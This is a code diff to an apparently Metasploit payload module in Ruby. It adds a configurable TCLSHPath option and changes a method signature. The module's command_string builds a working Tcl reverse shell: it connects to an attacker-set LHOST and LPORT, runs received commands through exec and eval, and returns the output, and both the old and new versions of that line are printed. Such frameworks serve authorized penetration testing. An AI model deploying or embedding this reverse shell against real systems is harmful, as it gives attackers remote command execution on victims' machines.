@@ -29,12 +29,17 @@ module MetasploitModule
         }
       )
     )
+    register_advanced_options(
+      [
+        OptString.new('TCLSHPath', [true, 'The path to the TCLSH executable', 'tclsh'])
+      ]
+    )
   end
 
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     super + command_string
   end
 
@@ -42,6 +47,6 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    %(echo 'set s [socket #{datastore['LHOST']} #{datastore['LPORT']}];set c "";while {$c != "exit"} {flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} {puts $s $r};flush $s;};close $s;'|tclsh)
+    %(echo 'set s [socket #{datastore['LHOST']} #{datastore['LPORT']}];set c "";while {$c != "exit"} {flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} {puts $s $r};flush $s;};close $s;'|#{datastore['TCLSHPath']})
   end
 end
